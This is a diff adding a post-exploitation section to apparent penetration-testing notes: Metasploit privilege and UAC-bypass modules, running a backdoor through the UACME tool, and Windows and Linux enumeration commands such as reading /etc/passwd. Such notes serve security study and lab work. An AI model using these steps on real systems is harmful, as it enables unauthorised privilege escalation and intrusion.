@@ -111,3 +111,38 @@ impersonate_token TOKEN
 shell
 whoami // find out who we are after impersonating token
 
+
+#### POST EXPLOITATION ####
+
+
+
+run post/windows/gather/win_privs // find out admin privs, UAC en/disabled
+search in metasploit > search uac
+use exploit/windows/local/bypassuac_injection // set session id to the target meterpreter session
+
+Manually you can download UACME from github en upload the UAC exploit in the meterpreter session.
+akagi64.exe 10 c:\users\els\downloads\exploit.exe // runs the exploit backdoor with the UAC bypass tool using option 10
+
+PILAGING
+sysinfo // gathering information about OS en  Architecture (x86/x64 <-- important for payload en compiling) 
+getuid // check user we are currently running on target machine
+run post/windows/gather/enum_services // get list of services on remote machine
+run post/windows/gather/enum_ad_users // list users from domain
+run enum_shares // list shares
+run winenum // save all information into local files to inspect them later
+run post/windows/gather/enum_applications // list installed applications
+
+after running shell in a meterpreter session we can use following commands (windows commands)
+wmic service get caption,startname,stat,pathname // list services
+net start // list started services
+net view /domain // viewing the domain
+net group "Domain Controllers" /domain // list the domain controllers
+net user // list users
+
+
+for linux commands we can use the following
+service --status-all // list all services
+ps // list processes
+cat /etc/passwd // list users
+
+
